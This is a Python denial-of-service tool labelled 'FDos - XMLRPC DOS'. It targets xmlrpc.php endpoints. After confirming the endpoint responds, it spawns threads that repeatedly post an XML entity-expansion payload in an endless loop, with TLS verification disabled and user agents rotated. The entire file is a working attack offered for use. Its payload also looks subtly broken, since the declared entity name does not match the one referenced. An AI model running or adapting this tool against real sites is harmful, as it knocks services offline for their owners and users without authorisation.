#############################################################
# FDos - XMLRPC DOS.                                        #
#############################################################

import requests
import sys
import threading
import ctypes
import os
from urllib.parse import urlparse
from ddos.ua_ref import user_agent
requests.packages.urllib3.disable_warnings()

class Xmlrpc:
    packet_sent = 0
    def __init__(self, target, thread, sleep) -> None:
        self.target = target
        self.thread = thread 
        self.sleep = sleep

    def att_sent(self):
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Total Packet Sent : {self.packet_sent}')
    
    def send(self, site):
        # you can change if you want.
        payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE nfex [<!ENTITY fooster "oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"]>
<methodCall>
    <methodName>lmao&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;&fuckyou;</methodName>
    <params>
        <param><value>oo</value></param>
        <param><value>oo</value></param>
    </params>
</methodCall>"""
        while True:
            self.att_sent()
            headers = {
                "Accept": "*/*",
                "User-Agent": user_agent(),
                "Content-Type": "text/xml",
                "Connection": "keep-alive",
                "Content-Length": f"{len(payload)}"
            }
            try:
                req = requests.post(site, headers=headers, data=payload, allow_redirects=False, timeout=3, verify=False)
                self.packet_sent += 1
            except requests.exceptions.Timeout:
                print("Timeout. Server Respon : {}".format(req.status_code))
            except Exception as e: 
                print("Error when connect. Server Respon : {}".format(req.status_code))
    def attack(self):
        th = []
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/117.0",
            "Content-Type": "text/xml",
            "Accept": "*/*"
        }
        if "://" not in self.target:
            self.target = "http://"+self.target
        site = urlparse(self.target).scheme + "://" + urlparse(self.target).netloc + urlparse(self.target).path
        print("Checking xmlrpc.php ...")
        try:
            # you can change if you want.
            payload = """<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>demo.sayHello</methodName> 
<params> 
<param>
<value>admin</value>
</param> 
</params> 
</methodCall>"""
            req = requests.post(site, headers=headers, data=payload, timeout=10, allow_redirects=False, verify=False).text
            if "<string>Hello!</string>" in req:
                print("xmlrpc.php is work.")
                print("Starting Attack...")
                for _ in range(self.thread):
                    thread = threading.Thread(target=self.send, args=(site, ))
                    th.append(thread)
                    thread.start()
                for t in th:
                    t.join()
            else:
                print("xmlrpc.php not working. Exiting..."); sys.exit(0)
        except Exception as e:
            print(e)
            print("Error when connect to xmlrpc.php. Exiting..."); sys.exit(0)
        